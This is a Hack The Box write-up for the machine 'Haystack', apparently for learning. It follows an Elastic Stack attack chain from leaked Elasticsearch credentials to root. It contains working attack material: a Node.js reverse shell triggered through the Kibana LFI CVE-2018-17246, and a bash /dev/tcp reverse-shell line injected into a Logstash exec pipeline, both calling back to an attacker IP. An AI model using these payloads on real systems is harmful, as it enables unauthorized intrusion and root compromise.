---
title: 'Haystack'
target: 'Hack The Box — Haystack'
difficulty: 'easy'
date: 2025-12-01
summary: 'An HTB machine — scanning with nmap to find SSH (22), HTTP (80) running nginx 1.12.2 serving a single image, and Elasticsearch (9200) on a Linux host, extracting a base64-encoded Spanish hint from the needle.jpg image using strings, enumerating Elasticsearch indices to find base64-encoded credentials for user security in the quotes index by searching for the keyword clave, SSHing in as security, discovering Kibana on localhost port 5601 via /proc/net/tcp, exploiting CVE-2018-17246 (Kibana LFI) to execute a Node.js reverse shell as kibana, reading Logstash configuration files accessible to the kibana group that define a pipeline watching /opt/kibana/logstash_* files for lines matching a Spanish command pattern and executing the extracted command as root, and writing a crafted log entry with a bash reverse shell to escalate to root.'
role: 'pentest'
tags: ['nmap', 'nginx', 'elasticsearch', 'steganography', 'strings', 'base64', 'kibana', 'cve-2018-17246', 'lfi', 'logstash', 'grok', 'ssh-port-forwarding', 'elastic-stack', 'privilege-escalation', 'linux']
problem: 'Haystack is an easy-rated Linux machine running the Elastic Stack — Elasticsearch, Kibana, and Logstash. Three ports are open: SSH (22), HTTP (80) serving a single image through nginx, and Elasticsearch (9200) exposing its API without authentication. The webpage contains only needle.jpg, which has a base64-encoded Spanish string embedded in it hinting to search for the word clave in Elasticsearch. The quotes index contains base64-encoded credentials for the user security. A Kibana instance on localhost port 5601 is vulnerable to CVE-2018-17246, a local file inclusion that executes JavaScript files. Logstash runs as root and is configured to watch /opt/kibana/logstash_* for lines matching a Spanish-language command pattern via a Grok filter, then execute whatever command is extracted — allowing any user who can write to /opt/kibana to run commands as root.'
action: 'Ran nmap to identify three open ports — 22/tcp (SSH) running OpenSSH 7.4, 80/tcp (HTTP) running nginx 1.12.2 serving a page with only an image, and 9200/tcp running Elasticsearch behind nginx. The website contained only needle.jpg. Ran strings -n 20 on needle.jpg and found a base64-encoded string bGEgYWd1amEgZW4gZWwgcGFqYXIgZXMgImNsYXZlIg== which decoded to the Spanish phrase la aguja en el pajar es clave — the needle in the haystack is clave. Accessed the Elasticsearch API on port 9200 and listed indices — quotes, bank, .kibana, and api. Dumped all documents from the quotes index using _search?size=1000 and grepped for clave. Found two entries with base64-encoded data — dXNlcjogc2VjdXJpdHkg decoded to user: security and cGFzczogc3BhbmlzaC5pcy5rZXk= decoded to pass: spanish.is.key. SSHed in as security with spanish.is.key and retrieved the user flag. Enumerated listening ports through /proc/net/tcp and discovered port 5601 bound to localhost — Kibana. Set up SSH port forwarding with -L 5601:localhost:5601 to access Kibana from the attacker machine. Identified Kibana version as vulnerable to CVE-2018-17246 — a local file inclusion in the API console endpoint. Created a Node.js reverse shell script at /dev/shm/0xdf.js and triggered it via the Kibana LFI path /api/console/api_server?sense_version=@@SENSE_VERSION&apis=../../../../../../.../../../../dev/shm/0xdf.js. Received a reverse shell as kibana. As kibana, read the Logstash configuration files in /etc/logstash/conf.d/ — input.conf watches /opt/kibana/logstash_* every 10 seconds, filter.conf uses a Grok pattern to extract commands from lines matching Ejecutar comando: followed by the command, and output.conf executes the extracted command. Used the Grok Debugger in Kibana to verify the filter pattern. Wrote a crafted log entry — Ejecutar comando: bash -c bash -i >& /dev/tcp/10.10.14.8/443 0>&1 — to /opt/kibana/logstash_0xdf. Logstash processed the file and executed the command as root. Received a root reverse shell and retrieved the root flag.'
outcome: 'Gained root access through a three-stage attack chain exploiting the Elastic Stack. A base64-encoded hint in an image led to credentials hidden in Elasticsearch, CVE-2018-17246 in Kibana provided lateral movement from security to kibana, and a misconfigured Logstash pipeline that executes commands from watched log files provided root.'
draft: false
---

## Background

Haystack is an easy-rated Linux machine built around the Elastic Stack — Elasticsearch, Kibana, and Logstash working together as a data pipeline. It's not a realistic pentesting scenario in the traditional sense, but it provides hands-on exposure to tools that are common on the blue side of security operations. The attack chain starts with finding a needle in a haystack (literally — a hidden string in an image that points to credentials buried in an Elasticsearch index), pivots through a Kibana LFI vulnerability, and finishes by abusing a Logstash pipeline that executes commands from log files it ingests. Every escalation step involves a different component of the Elastic Stack.

---

## Enumeration

An nmap scan against the target reveals three open ports:

```
nmap -sC -sV -p 22,80,9200 10.10.10.115
```

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey:
|   2048 2a:8d:e2:92:8b:14:b6:3f:e4:2f:3a:47:43:23:8b:2b (RSA)
|   256 e7:5a:3a:97:8e:8e:72:87:69:a3:0d:d1:00:bc:1f:09 (ECDSA)
|_  256 01:d2:59:b2:66:0a:97:49:20:5f:1c:84:eb:81:ed:95 (ED25519)
80/tcp   open  http    nginx 1.12.2
|_http-server-header: nginx/1.12.2
|_http-title: Site doesn't have a title (text/html).
9200/tcp open  http    nginx 1.12.2
| http-methods:
|_  Potentially risky methods: DELETE
|_http-server-header: nginx/1.12.2
|_http-title: Site doesn't have a title (application/json; charset=UTF-8).
```

Three services — **SSH on port 22**, **HTTP on port 80**, and another **HTTP service on port 9200**. Both web services run behind nginx 1.12.2. Port 9200 is the default port for Elasticsearch's REST API, and the `application/json` content type in the title confirms it. The `DELETE` method being available is also characteristic of Elasticsearch — it supports full CRUD operations through its API.

---

## The needle in the haystack — port 80

The website on port 80 is minimal — the entire HTML source is just an image tag pointing to `needle.jpg`:

```html
<html>
<body>
<img src="needle.jpg" />
</body>
</html>
```

Directory brute-forcing with `gobuster` returns nothing else. The image itself is the only content, which suggests the clue is embedded in the file. Running `strings` with a minimum length filter to cut through the noise:

```
strings -n 20 needle.jpg
```

```
%&'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz
&'()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz
bGEgYWd1amEgZW4gZWwgcGFqYXIgZXMgImNsYXZlIg==
```

That last string is unmistakably base64 — the `==` padding gives it away. Decoding it:

```
echo "bGEgYWd1amEgZW4gZWwgcGFqYXIgZXMgImNsYXZlIg==" | base64 -d
```

```
la aguja en el pajar es "clave"
```

Spanish for **"the needle in the haystack is clave"** — a direct hint to search for the word `clave` (which means "key" or "password" in Spanish) somewhere in the data. Given that Elasticsearch is running on port 9200, that's the haystack to search through.

---

## Elasticsearch enumeration — port 9200

Visiting port 9200 in a browser shows the Elasticsearch API root, confirming the cluster is accessible without authentication:

![Browser at 10.10.10.115:9200 showing JSON response with Elasticsearch cluster information — name iQEYHgS, cluster_name elasticsearch, cluster_uuid pjrX7V_gSFmJY-DxP4tCQg, version number 6.4.2, build_flavor default, build_type rpm, build_hash 04711c2, build_date 2018-09-26, build_snapshot false, lucene_version 7.4.0, minimum_wire_compatibility_version 5.6.0, minimum_index_compatibility_version 5.0.0, tagline You Know for Search.](/writeups/htb-haystack/01-elasticsearch-api.png)

**Elasticsearch 6.4.2** — running with no authentication, fully exposed. The tagline "You Know, for Search" is the default Elasticsearch greeting. Listing the available indices to see what data is stored:

```
curl http://10.10.10.115:9200/_cat/indices?v
```

```
health status index   uuid                   pri rep docs.count docs.deleted store.size pri.store.size
yellow open   quotes  ZG2D1IqkQNiNZmi2HRImnQ   5   1      253            0    262.7kb        262.7kb
yellow open   bank    eSVpNfCfREyYoVigNWcrMw   5   1     1000            0    483.2kb        483.2kb
green  open   .kibana 6tjAYZrgQ5CwwR0g6VOoRg   1   0        1            0        4kb            4kb
yellow open   api     K1OH6o0_Q0OUe5n3vTcGog   5   1        1            0      3.6kb          3.6kb
```

Four indices — `quotes` (253 documents), `bank` (1000 documents), `.kibana` (internal Kibana state), and `api` (1 document). The hint said to search for `clave`, so the task is to dump these indices and find it.

The `bank` index contains 1000 account records with names, addresses, and balances — no mention of `clave`. The `quotes` index, however, contains Spanish-language quotes, and grepping through the full dump reveals two hits:

```
curl -s -X GET "http://10.10.10.115:9200/quotes/_search?size=1000" \
  -H 'Content-Type: application/json' \
  -d '{"query":{"match_all":{}}}' | jq -c '.hits.hits[]' | grep clave
```

```json
{"_index":"quotes","_type":"quote","_id":"111","_score":1,"_source":{"quote":"Esta clave no se puede perder, la guardo aca: cGFzczogc3BhbmlzaC5pcy5rZXk="}}
{"_index":"quotes","_type":"quote","_id":"45","_score":1,"_source":{"quote":"Tengo que guardar la clave para la maquina: dXNlcjogc2VjdXJpdHkg"}}
```

Two quotes containing base64-encoded credentials hidden among 253 entries:

- *"Esta clave no se puede perder, la guardo aca"* — "This key cannot be lost, I'll keep it here"
- *"Tengo que guardar la clave para la maquina"* — "I have to save the key for the machine"

Decoding both:

```
echo "cGFzczogc3BhbmlzaC5pcy5rZXk=" | base64 -d
pass: spanish.is.key

echo "dXNlcjogc2VjdXJpdHkg" | base64 -d
user: security
```

Credentials recovered — **security : spanish.is.key**.

---

## Shell as security

The credentials work for SSH:

```
ssh security@10.10.10.115
```

```
security@10.10.10.115's password: spanish.is.key
Last login: Sun Jun 30 09:17:48 2019 from 10.10.14.51
[security@haystack ~]$
```

The user flag was retrieved. As security, there isn't much else accessible — no sudo privileges, no interesting SUID binaries, no writable cron jobs. But checking for services listening only on localhost reveals something hidden. Since `netstat` isn't installed, `/proc/net/tcp` provides the raw data:

```
cat /proc/net/tcp | grep '00000000:0000 0A'
```

Translating the hex addresses and ports reveals four listening services:

| **Hex** | **Address** | **Port** |
|:---|:---|:---|
| `00000000:0050` | 0.0.0.0 | 80 |
| `00000000:23F0` | 0.0.0.0 | 9200 |
| `00000000:0016` | 0.0.0.0 | 22 |
| `0100007F:15E1` | 127.0.0.1 | **5601** |

Port **5601** is listening on localhost only — the default port for **Kibana**. It wasn't visible in the nmap scan because it's bound exclusively to the loopback interface. SSH port forwarding provides access from the attacker machine:

```
ssh> -L 5601:localhost:5601
Forwarding port.
```

Browsing to `http://127.0.0.1:5601` through the tunnel loads the Kibana dashboard:

![Kibana dashboard showing the Add Data to Kibana landing page with sections for APM, Logging, Metrics, and Security Analytics at the top. Below are two sections — Visualize and Explore Data with options for APM, Dashboard, Discover, Graph, Machine Learning, Timelion, and Visualize on the left, and Manage and Administer the Elastic Stack with Console, Index Patterns, Monitoring, Saved Objects, Security Settings, and Watcher on the right. Left sidebar shows navigation for Discover, Visualize, Dashboard, Timelion, APM, Dev Tools, Monitoring, and Management.](/writeups/htb-haystack/02-kibana-dashboard.png)

Kibana is the visualization and query frontend for Elasticsearch — it provides dashboards, data exploration, and administrative tools. More importantly, this version is vulnerable to a known LFI vulnerability.

---

## Lateral movement — CVE-2018-17246

**CVE-2018-17246** is a local file inclusion vulnerability in Kibana's API console endpoint. The `api_server` parameter accepts a path that's intended to load API definition files, but insufficient path validation allows traversing out of the expected directory and including arbitrary JavaScript files on the filesystem. Since Kibana runs on Node.js, any included `.js` file is executed as server-side JavaScript.

Creating a Node.js reverse shell on the target at `/dev/shm/`:

```javascript
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(443, "10.10.14.8", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/;
})();
```

The `return /a/` at the end is a critical detail — it prevents the Node.js application from crashing after the shell connects, which would kill the Kibana process and the shell along with it. Triggering the LFI:

```
http://127.0.0.1:5601/api/console/api_server?sense_version=@@SENSE_VERSION&apis=../../../../../../.../../../../dev/shm/0xdf.js
```

```
root@kali# nc -lnvp 443
Ncat: Connection from 10.10.10.115.
Ncat: Connection from 10.10.10.115:55962.
id
uid=994(kibana) gid=992(kibana) grupos=992(kibana) contexto=system_u:system_r:unconfined_service_t:s0
```

A shell as **kibana** — a service account with access to the Elastic Stack's configuration files that security couldn't read.

---

## Privilege escalation — Logstash pipeline abuse

As kibana, the first thing to notice is that **Logstash is running as root**:

```
ps awuxx | grep logstash
```

The process listing shows Java running Logstash with `--path.settings /etc/logstash`. The Logstash configuration directory is now readable because it's group-owned by `kibana`:

```
ls -l /etc/logstash/conf.d/
total 12
-rw-r-----. 1 root kibana 131 jun 20 10:59 filter.conf
-rw-r-----. 1 root kibana 186 jun 24 08:12 input.conf
-rw-r-----. 1 root kibana 109 jun 24 08:12 output.conf
```

Three configuration files define the Logstash pipeline — what it reads, how it processes, and what it does with the result.

**input.conf** — what Logstash watches:

```
input {
        file {
                path => "/opt/kibana/logstash_*"
                start_position => "beginning"
                sincedb_path => "/dev/null"
                stat_interval => "10 second"
                type => "execute"
                mode => "read"
        }
}
```

Logstash watches for any file matching `/opt/kibana/logstash_*` and checks every 10 seconds. Every line read from matching files is tagged with type `execute`. The `sincedb_path => "/dev/null"` means it doesn't track read positions — it re-reads files from the beginning each time.

**filter.conf** — how Logstash processes each line:

```
filter {
        if [type] == "execute" {
                grok {
                        match => { "message" => "Ejecutar\s*comando\s*:\s+%{GREEDYDATA:comando}" }
                }
        }
}
```

A **Grok filter** — Logstash's pattern matching engine — parses each line against a specific pattern. The pattern looks for the Spanish phrase "Ejecutar comando:" (meaning "Execute command:") followed by arbitrary data captured into a field called `comando`.

**output.conf** — what Logstash does with the result:

```
output {
        if [type] == "execute" {
                stdout { codec => json }
                exec {
                        command => "%{comando} &"
                }
        }
}
```

The `exec` output plugin runs whatever was captured in the `comando` field **as a system command**. Since Logstash runs as root, this is arbitrary command execution as root.

Testing the Grok pattern in Kibana's built-in **Grok Debugger** to verify the exact syntax needed. With an empty input field, the pattern shows no matches:

![Kibana Grok Debugger interface with the Debugger tab active. The Input field is empty with placeholder text. The Grok Pattern field contains Ejecutar\s*comando\s*:\s+%{GREEDYDATA:comando}. Checkboxes for Add custom patterns, Keep Empty Captures, Named Captures Only, and Singles are unchecked. Autocomplete is checked. The output area shows No Matches.](/writeups/htb-haystack/03-grok-empty.png)

Adding `Ejecutar comando: id` as the input string produces a successful match — the command `id` is extracted into the `comando` field:

![Kibana Grok Debugger with input text Ejecutar comando: id in the Input field. The same Grok pattern in the pattern field. The output area shows a parsed JSON result with comando as an array containing the string id — confirming the pattern correctly extracts the command.](/writeups/htb-haystack/04-grok-parsed.png)

The pattern works. Writing a crafted log entry with a reverse shell command to a file in the watched directory:

```
echo "Ejecutar comando: bash -c 'bash -i >& /dev/tcp/10.10.14.8/443 0>&1'" > /opt/kibana/logstash_0xdf
```

Within 10 seconds, Logstash picks up the file, the Grok filter extracts the bash reverse shell command, and the exec output plugin runs it as root:

```
root@kali# nc -lnvp 443
Ncat: Connection from 10.10.10.115.
Ncat: Connection from 10.10.10.115:40238.
bash: no hay control de trabajos en este shell
[root@haystack /]# id
uid=0(root) gid=0(root) grupos=0(root) contexto=system_u:system_r:unconfined_service_t:s0
```

**Root** — the Logstash pipeline executed the command with its own privileges. The root flag was retrieved.

---

## What I took from this

Haystack is less about exploitation technique and more about understanding how the components of the Elastic Stack fit together — and what happens when each one is slightly misconfigured. Elasticsearch is running without authentication, Kibana has an unpatched LFI, and Logstash is configured to execute arbitrary commands from files in a writable directory. None of these misconfigurations exist in isolation — they form a chain where each one enables the next.

The Elasticsearch step is a reminder that data stores exposed without authentication are searchable by anyone. In a real environment, Elasticsearch instances exposed to the internet (or even internally without auth) are a common finding — Shodan regularly indexes thousands of them. The credentials were hidden among 253 quotes in a Spanish-language index, which is a CTF contrivance, but the underlying principle is real: sensitive data stored in a search engine is exactly as findable as the engine is designed to make it.

The Kibana LFI (CVE-2018-17246) is interesting because it turns file inclusion into code execution inherently — there's no need to find a way to make the server interpret the included file as code, because Kibana runs on Node.js and `require()` executes JavaScript by design. The `return /a/` trick to prevent the application from crashing is a practical detail worth remembering — without it, the reverse shell would connect and immediately die when the Kibana process crashes from the unexpected module.

The Logstash privilege escalation is the most instructive part of the box. Logstash pipelines are powerful — they're designed to ingest data, transform it, and output it, and the `exec` output plugin exists for legitimate automation purposes. But running Logstash as root with an `exec` output that takes its command from user-controllable input is equivalent to giving anyone with write access to the watched directory a root shell. The fix is straightforward — run Logstash as a dedicated service account, restrict file permissions on the watched directory, and avoid using the `exec` output plugin with unconstrained input. The Grok Debugger built into Kibana was useful for verifying exactly what input format the filter expected — a tool designed for defenders that worked just as well for the attacker.
